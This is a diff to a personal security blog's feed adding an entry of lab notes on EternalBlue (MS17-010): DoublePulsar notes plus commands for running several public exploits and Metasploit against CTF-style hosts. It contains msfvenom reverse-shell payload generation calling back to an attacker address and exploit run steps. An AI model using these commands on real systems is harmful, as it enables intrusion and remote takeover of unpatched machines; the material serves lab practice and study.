@@ -4,13 +4,136 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-04-17T18:05:46+08:00</updated>
+ <updated>2022-04-18T16:54:22+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Eternal Blue - Exploits</title>
+   <link href="https://mvineza.github.io/spindel/2022/04/18/eternal-blue-exploits"/>
+   <updated>2022-04-18T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/04/18/Eternal-Blue--Exploits</id>
+   <content type="html">&lt;h2 id=&quot;double-pulsar&quot;&gt;Double Pulsar&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;A sophisticated backdoor implant which serves as a loading dock for other exploits&lt;/li&gt;
+  &lt;li&gt;RAM-resident implant
+    &lt;ul&gt;
+      &lt;li&gt;Removed when system is rebooted?&lt;/li&gt;
+      &lt;li&gt;Once installed on victim system, it can receive additional malwares and remote commands&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Can also infect RDP&lt;/li&gt;
+  &lt;li&gt;Here is an example &lt;a href=&quot;https://github.com/countercept/doublepulsar-detection-script&quot;&gt;detection script&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;42315py&quot;&gt;42315.py&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Seems not working for windows xp&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Get mysmb module&lt;/span&gt;
+wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
+
+&lt;span class=&quot;c&quot;&gt;# Install dependencies&lt;/span&gt;
+virtualenv &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; py2 virtualenv_eternalblue
+&lt;span class=&quot;nb&quot;&gt;source &lt;/span&gt;virtualenv_eternalblue/bin/activate
+pip &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;impacket
+searchsploit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 42315.py
+
+&lt;span class=&quot;c&quot;&gt;# Optional - add username pass (use this if&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# anonymous login doesn&apos;t work)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;virtualenv_eternalblue&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ➜  relevant &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;42315.py| egrep &lt;span class=&quot;s1&quot;&gt;&apos;^(USER|PASS)&apos;&lt;/span&gt;
+USERNAME &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Bob&apos;&lt;/span&gt;
+PASSWORD &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;!P@$$W0rD!123&apos;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;virtualenv_eternalblue&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ➜  relevant 
+
+&lt;span class=&quot;c&quot;&gt;# Run&lt;/span&gt;
+python 42315.py 10.10.82.56
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;42031py&quot;&gt;42031.py&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Seems not working on windows xp&lt;/li&gt;
+  &lt;li&gt;Also crashes “Windows 7 Professional 7601 Service Pack 1” (HTB Blue)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Setup similar virtualenv with 42315.py&lt;/span&gt;
+searchsploit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 42031.py
+
+&lt;span class=&quot;c&quot;&gt;# Update credentials&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;virtualenv_eternalblue&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ➜  relevant &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;42031.py | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;login_standard
+	conn.login_standard&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Bill&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;Juw4nnaM4n420696969!$$$&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;virtualenv_eternalblue&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ➜  relevant
+
+&lt;span class=&quot;c&quot;&gt;# Generate shell code file&lt;/span&gt;
+msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/shell/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.11.40.33 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4444 &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; x86/shikata_ga_nai &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; exe &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eternalblue.exe
+
+&lt;span class=&quot;c&quot;&gt;# Run&lt;/span&gt;
+python 42031.py 10.10.177.9 eternalblue.exe
+
+&lt;span class=&quot;c&quot;&gt;# NOTE: This doesnt work for windows server 2016&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;metasploit&quot;&gt;Metasploit&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Seems the most stable&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# If victim is vulnerable to ms17-010 eternalblue,&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# try to use metasploit. NOTE: if this fail on first&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# time try running it a couple more times.&lt;/span&gt;
+msf&amp;gt; use windows/smb/ms17_010_eternalblue
+msf&amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;rhosts 10.10.10.13
+msf&amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;lhost tun0
+msf&amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;payload windows/x64/shell/reverse_tcp
+msf&amp;gt; run
+
+&lt;span class=&quot;c&quot;&gt;# Try upgrading to meterpreter shell&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;send_and_executepy&quot;&gt;send_and_execute.py&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Versions tested:
+    &lt;ul&gt;
+      &lt;li&gt;Windows 7 Professional 7601 Service Pack 1 (HTB Blue)&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Get &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysmb.py&lt;/code&gt; &lt;a href=&quot;https://github.com/worawit/MS17-010/blob/master/mysmb.py&quot;&gt;here&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Generate payload&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.51 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4444 &lt;span class=&quot;nv&quot;&gt;EXITFUNC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;thread &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; exe &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; x86 &lt;span class=&quot;nt&quot;&gt;--platform&lt;/span&gt; windows &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; ms17-010.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Open netcat listener&lt;/li&gt;
+  &lt;li&gt;Run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;send_and_execute.py&lt;/code&gt;. Get it &lt;a href=&quot;https://github.com/helviojunior/MS17-010&quot;&gt;here&lt;/a&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python send_and_execute.py legacy ms17-010.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;troubleshooting&quot;&gt;Troubleshooting&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;If you get permission errors on named pipes, try changing usernames to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt; and password blanks&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;USERNAME&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;PASSWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.secpod.com/blog/doublepulsar-a-very-sophisticated-payload-for-windows/&quot;&gt;DoublePulsar – A Very Sophisticated Payload for Windows&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.rapid7.com/blog/post/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/&quot;&gt;Open-Source Command and Control of the DOUBLEPULSAR Implant&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/worawit/MS17-010&quot;&gt;MS17-010 Exploits&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Wordpress Job-Manager Plugin File Disclosure</title>
